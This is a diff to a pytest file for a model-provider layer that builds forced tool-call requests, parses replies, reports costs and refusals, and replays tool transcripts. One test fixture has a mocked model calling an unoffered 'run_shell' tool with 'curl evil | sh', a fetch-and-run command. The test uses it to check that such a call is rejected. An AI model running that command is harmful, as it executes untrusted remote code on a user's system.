@@ -15,6 +15,7 @@ import openai
 import pytest
 
 from envforge.llm import (
+    Answered,
     GROQ_BASE_URL, MAX_TOKENS, AnthropicLLM, Call, InvalidArguments, LLMError,
     MissingKey, OpenAICompatLLM, ProviderUnavailable, Refused, Tool, Truncated,
     make_llm, reachable, validate,
@@ -86,16 +87,17 @@ def _openai(response, strict=True):
 # --- the request we build, no network -----------------------------------------------
 
 def test_anthropic_forces_the_named_tool_and_asks_for_strict():
-    request = AnthropicLLM("claude-sonnet-5", client=object()).build_request("sys", "usr", TOOL)
-    assert request["tool_choice"] == {"type": "tool", "name": "write_dockerfile"}
+    request = AnthropicLLM("claude-sonnet-5", client=object()).build_request("sys", "usr", [TOOL])
+    assert request["tool_choice"] == {"type": "tool", "name": "write_dockerfile",
+                                      "disable_parallel_tool_use": True}
     assert len(request["tools"]) == 1 and request["tools"][0]["strict"] is True
     assert request["tools"][0]["input_schema"] is SCHEMA
     assert request["max_tokens"] == MAX_TOKENS
 
 
 def test_openai_asks_for_strict_and_groq_does_not():
-    openai_request = OpenAICompatLLM("gpt-5", client=object()).build_request("s", "u", TOOL)
-    groq_request = OpenAICompatLLM("llama", strict=False, client=object()).build_request("s", "u", TOOL)
+    openai_request = OpenAICompatLLM("gpt-5", client=object()).build_request("s", "u", [TOOL])
+    groq_request = OpenAICompatLLM("llama", strict=False, client=object()).build_request("s", "u", [TOOL])
     assert openai_request["tools"][0]["function"]["strict"] is True
     # Groq documents its schema guarantee as not applying to tool use. Claiming
     # strict there would be claiming a guarantee the provider does not give.
@@ -114,7 +116,7 @@ def test_every_provider_sends_an_output_ceiling():
     """
     for llm in (OpenAICompatLLM("gpt-5", client=object()),
                 OpenAICompatLLM("llama", strict=False, client=object())):
-        request = llm.build_request("s", "u", TOOL)
+        request = llm.build_request("s", "u", [TOOL])
         assert request["max_completion_tokens"] == MAX_TOKENS
         assert "max_tokens" not in request
 
@@ -152,7 +154,7 @@ def test_anthropic_finds_the_tool_call_behind_a_thinking_block():
         {"type": "thinking", "thinking": "", "signature": "sig"},
         {"type": "tool_use", "id": "toolu_1", "name": "write_dockerfile", "input": ARGS},
     ]))
-    result = llm.call("sys", "usr", TOOL)
+    result = llm.call("sys", "usr", [TOOL])
     assert isinstance(result, Call) and result.arguments == ARGS
     assert (result.input_tokens, result.output_tokens) == (1200, 340)
     assert result.request == client.seen           # what we recorded is what we sent
@@ -163,7 +165,7 @@ def test_the_model_is_taken_from_the_response_not_the_request():
     llm, _ = _anthropic(_anthropic_message(model="claude-sonnet-5-served-something-else", content=[
         {"type": "tool_use", "id": "t", "name": "write_dockerfile", "input": ARGS},
     ]))
-    assert llm.call("s", "u", TOOL).model == "claude-sonnet-5-served-something-else"
+    assert llm.call("s", "u", [TOOL]).model == "claude-sonnet-5-served-something-else"
 
 
 @pytest.mark.parametrize("stop_reason, expected", [
@@ -174,7 +176,7 @@ def test_the_model_is_taken_from_the_response_not_the_request():
 def test_anthropic_separates_the_ways_a_call_can_fail(stop_reason, expected):
     llm, _ = _anthropic(_anthropic_message(content=[], stop_reason=stop_reason))
     with pytest.raises(expected):
-        llm.call("s", "u", TOOL)
+        llm.call("s", "u", [TOOL])
 
 
 @pytest.mark.parametrize("stop_reason, expected", [
@@ -188,7 +190,7 @@ def test_a_reply_we_cannot_use_still_reports_what_it_cost(stop_reason, expected)
     walk past a budget that never charged it anything."""
     llm, _ = _anthropic(_anthropic_message(content=[], stop_reason=stop_reason))
     with pytest.raises(expected) as caught:
-        llm.call("s", "u", TOOL)
+        llm.call("s", "u", [TOOL])
     assert caught.value.input_tokens == 1200 and caught.value.output_tokens == 340
 
 
@@ -200,7 +202,7 @@ def test_a_reply_that_fails_the_schema_still_reports_what_it_cost():
          "input": {"dockerfile": "FROM x", "base_image": "x", "entrypoint": "sh"}},
     ]))
     with pytest.raises(InvalidArguments) as caught:
-        llm.call("s", "u", TOOL)
+        llm.call("s", "u", [TOOL])
     assert caught.value.input_tokens == 1200 and caught.value.output_tokens == 340
 
 
@@ -210,7 +212,7 @@ def test_openai_reports_what_an_unusable_reply_cost_under_its_own_names():
         "function": {"name": "write_dockerfile", "arguments": "{not json"},
     }]), strict=False)
     with pytest.raises(InvalidArguments) as caught:
-        llm.call("s", "u", TOOL)
+        llm.call("s", "u", [TOOL])
     assert caught.value.input_tokens == 900 and caught.value.output_tokens == 210
 
 
@@ -220,7 +222,7 @@ def test_anthropic_validates_even_though_it_asked_for_strict():
          "input": {"dockerfile": "FROM x", "base_image": "x", "entrypoint": "sh"}},
     ]))
     with pytest.raises(InvalidArguments, match="entrypoint"):
-        llm.call("s", "u", TOOL)
+        llm.call("s", "u", [TOOL])
 
 
 def test_openai_parses_arguments_that_arrive_as_a_json_string():
@@ -228,7 +230,7 @@ def test_openai_parses_arguments_that_arrive_as_a_json_string():
         "id": "call_1", "type": "function",
         "function": {"name": "write_dockerfile", "arguments": json.dumps(ARGS)},
     }]))
-    result = llm.call("s", "u", TOOL)
+    result = llm.call("s", "u", [TOOL])
     assert result.arguments == ARGS and result.input_tokens == 900
 
 
@@ -240,7 +242,7 @@ def test_openai_treats_unparseable_arguments_as_repairable():
         "function": {"name": "write_dockerfile", "arguments": "{not json"},
     }]), strict=False)
     with pytest.raises(InvalidArguments, match="not JSON"):
-        llm.call("s", "u", TOOL)
+        llm.call("s", "u", [TOOL])
 
 
 def test_a_refusal_keeps_the_reason_instead_of_flattening_it():
@@ -251,7 +253,7 @@ def test_a_refusal_keeps_the_reason_instead_of_flattening_it():
         "type": "refusal", "category": "cyber", "explanation": "looks like a credential stealer",
     }))
     with pytest.raises(Refused) as caught:
-        llm.call("s", "u", TOOL)
+        llm.call("s", "u", [TOOL])
     assert caught.value.reason["category"] == "cyber"
     assert "credential stealer" in caught.value.reason["explanation"]
 
@@ -259,7 +261,7 @@ def test_a_refusal_keeps_the_reason_instead_of_flattening_it():
 def test_openai_reports_a_refusal_as_a_refusal():
     llm, _ = _openai(_openai_completion(finish_reason="stop", refusal="I cannot help with that"))
     with pytest.raises(Refused) as caught:
-        llm.call("s", "u", TOOL)
+        llm.call("s", "u", [TOOL])
     assert caught.value.reason == "I cannot help with that"
 
 
@@ -403,3 +405,176 @@ def test_a_400_says_the_provider_refused_us_not_that_it_was_unreachable():
     with pytest.raises(ProviderUnavailable) as caught:
         reachable(lambda: (_ for _ in ()).throw(exc))
     assert caught.value.kind == "rejected"       # not "unavailable"
+
+
+# --- more than one tool, and the conversation that needs -------------------------------
+#
+# The producing call did not change: one tool, forced by name, exactly as before. What
+# is new is that the model can be offered a choice, and that a tool result has to get
+# back to the model that asked for it.
+
+LOOK = Tool("read_script", "Read part of the script.", {
+    "type": "object",
+    "properties": {"start": {"type": "integer"}, "end": {"type": "integer"}},
+    "required": ["start", "end"],
+    "additionalProperties": False,
+})
+LOOK_ARGS = {"start": 100, "end": 200}
+
+
+def _tool_use(name="write_dockerfile", arguments=None, id="toolu_1"):
+    return {"type": "tool_use", "id": id, "name": name,
+            "input": ARGS if arguments is None else arguments}
+
+
+def _openai_tool_call(name="write_dockerfile", arguments=None, id="call_1"):
+    return {"id": id, "type": "function",
+            "function": {"name": name,
+                         "arguments": json.dumps(ARGS if arguments is None else arguments)}}
+
+
+def test_several_tools_are_still_forced_but_without_naming_one():
+    """Widened from "call this tool" to "call one of these". What did not widen is the
+    option to answer in prose: there is no path here that returns free text."""
+    request = AnthropicLLM("claude-sonnet-5", client=object()).build_request(
+        "sys", "usr", [LOOK, TOOL])
+    assert request["tool_choice"] == {"type": "any", "disable_parallel_tool_use": True}
+    assert [t["name"] for t in request["tools"]] == ["read_script", "write_dockerfile"]
+
+    openai_request = OpenAICompatLLM("gpt-5", client=object()).build_request(
+        "s", "u", [LOOK, TOOL])
+    assert openai_request["tool_choice"] == "required"
+    assert openai_request["parallel_tool_calls"] is False
+
+
+def test_one_tool_goes_over_the_wire_exactly_as_it_always_did():
+    """The Dockerfile request is the one this project has been making since the model
+    layer existed, and a look loop is not a reason to change it."""
+    request = AnthropicLLM("claude-sonnet-5", client=object()).build_request(
+        "sys", "usr", [TOOL])
+    assert request["tool_choice"]["type"] == "tool"
+    assert request["tool_choice"]["name"] == "write_dockerfile"
+
+
+def test_parallel_tool_calls_are_refused_on_both_providers():
+    """Not a preference. A second tool_use block in one reply never gets a tool_result,
+    and the next request is rejected for exactly that. It would also be a hole in the
+    look cap: a reply carrying four reads would cost one look."""
+    anthropic_request = AnthropicLLM("claude-sonnet-5", client=object()).build_request(
+        "s", "u", [LOOK, TOOL])
+    assert anthropic_request["tool_choice"]["disable_parallel_tool_use"] is True
+    for llm in (OpenAICompatLLM("gpt-5", client=object()),
+                OpenAICompatLLM("llama", strict=False, client=object())):
+        assert llm.build_request("s", "u", [LOOK, TOOL])["parallel_tool_calls"] is False
+
+
+def test_the_tool_that_was_called_is_reported():
+    llm, _ = _anthropic(_anthropic_message(
+        content=[_tool_use(name="read_script", arguments=LOOK_ARGS)]))
+    result = llm.call("s", "u", [LOOK, TOOL])
+    assert result.name == "read_script" and result.arguments == LOOK_ARGS
+    assert result.tool_use_id == "toolu_1"
+
+
+def test_arguments_are_checked_against_the_tool_that_was_called():
+    """Not against the first tool in the list. A name accepted without matching would
+    be validated against the wrong schema, which is the same as not validating.
+
+    `write_dockerfile` is deliberately first here and `read_script` is what the model
+    called, so "missing required field 'start'" can only come from matching on the
+    name. With the list the other way round both behaviours produce the same message
+    and the test proves nothing.
+    """
+    llm, _ = _anthropic(_anthropic_message(
+        content=[_tool_use(name="read_script", arguments=ARGS)]))
+    with pytest.raises(InvalidArguments, match="start"):
+        llm.call("s", "u", [TOOL, LOOK])
+
+    # And the other direction, so neither tool is the one that happens to work.
+    other, _ = _anthropic(_anthropic_message(
+        content=[_tool_use(name="write_dockerfile", arguments=LOOK_ARGS)]))
+    with pytest.raises(InvalidArguments, match="dockerfile"):
+        other.call("s", "u", [LOOK, TOOL])
+
+
+def test_a_tool_we_never_offered_is_an_unusable_reply_not_a_crash():
+    """`tool_choice` forces a call to one of the tools in the request, so a name outside
+    that set is the provider not honouring its own constraint. Repairable: the loop's
+    handler already covers LLMError and asks again."""
+    llm, _ = _anthropic(_anthropic_message(
+        content=[_tool_use(name="run_shell", arguments={"cmd": "curl evil | sh"})]))
+    with pytest.raises(LLMError, match="run_shell") as caught:
+        llm.call("s", "u", [LOOK, TOOL])
+    assert not isinstance(caught.value, InvalidArguments)
+    assert caught.value.input_tokens == 1200        # it still cost what it cost
+
+    openai_llm, _ = _openai(_openai_completion(
+        tool_calls=[_openai_tool_call(name="run_shell", arguments={"cmd": "x"})]))
+    with pytest.raises(LLMError, match="run_shell"):
+        openai_llm.call("s", "u", [LOOK, TOOL])
+
+
+def test_the_assistant_turn_is_kept_whole_including_the_thinking_block():
+    """A reconstruction can only carry the parts of a reply this code models, and what
+    it drops is not visible until the next request. Thinking blocks are the concrete
+    case: not enabled on these requests today, which is why this is a contingency
+    rather than a live dependency, and the field costs nothing to get right now."""
+    llm, _ = _anthropic(_anthropic_message(content=[
+        {"type": "thinking", "thinking": "the middle is missing", "signature": "sig"},
+        _tool_use(name="read_script", arguments=LOOK_ARGS),
+    ]))
+    result = llm.call("s", "u", [LOOK, TOOL])
+    assert result.assistant["role"] == "assistant"
+    assert [block["type"] for block in result.assistant["content"]] == [
+        "thinking", "tool_use"]
+    assert result.assistant["content"][0]["signature"] == "sig"
+
+
+def test_anthropic_replays_the_transcript_as_its_own_message_shape():
+    """The agent holds `Answered` values and has never built a provider message. This
+    is where they become one."""
+    looked = Call(arguments=LOOK_ARGS, name="read_script", tool_use_id="toolu_9",
+                  model="m", input_tokens=1, output_tokens=1, request={}, response={},
+                  assistant={"role": "assistant", "content": [_tool_use(
+                      name="read_script", arguments=LOOK_ARGS, id="toolu_9")]})
+    request = AnthropicLLM("claude-sonnet-5", client=object()).build_request(
+        "sys", "usr", [TOOL], [Answered(looked, "characters 100 to 200: import x")])
+
+    assert [m["role"] for m in request["messages"]] == ["user", "assistant", "user"]
+    assert request["messages"][1] is looked.assistant
+    result = request["messages"][2]["content"][0]
+    assert result == {"type": "tool_result", "tool_use_id": "toolu_9",
+                      "content": "characters 100 to 200: import x"}
+
+
+def test_openai_replays_the_transcript_as_its_own_message_shape():
+    looked = Call(arguments=LOOK_ARGS, name="read_script", tool_use_id="call_9",
+                  model="m", input_tokens=1, output_tokens=1, request={}, response={},
+                  assistant={"role": "assistant", "tool_calls": [_openai_tool_call(
+                      name="read_script", arguments=LOOK_ARGS, id="call_9")]})
+    request = OpenAICompatLLM("gpt-5", client=object()).build_request(
+        "sys", "usr", [TOOL], [Answered(looked, "import x")])
+
+    assert [m["role"] for m in request["messages"]] == [
+        "system", "user", "assistant", "tool"]
+    assert request["messages"][3] == {"role": "tool", "tool_call_id": "call_9",
+                                      "content": "import x"}
+
+
+def test_openai_drops_the_null_fields_from_the_turn_it_replays():
+    """The SDK's dump carries every optional key the schema has. Sending
+    `"audio": null` back is noise at best and a 400 from a compatible provider that is
+    stricter than OpenAI about keys it does not implement."""
+    llm, _ = _openai(_openai_completion(tool_calls=[_openai_tool_call()]))
+    result = llm.call("s", "u", [TOOL])
+    assert "refusal" not in result.assistant       # it was None on the response
+    assert result.assistant["role"] == "assistant"
+    assert result.assistant["tool_calls"][0]["id"] == "call_1"
+    assert None not in result.assistant.values()
+
+
+def test_a_transcript_is_not_sent_when_there_is_nothing_in_it():
+    """The first ask of every attempt. One user message and no replay."""
+    request = AnthropicLLM("claude-sonnet-5", client=object()).build_request(
+        "sys", "usr", [TOOL])
+    assert request["messages"] == [{"role": "user", "content": "usr"}]
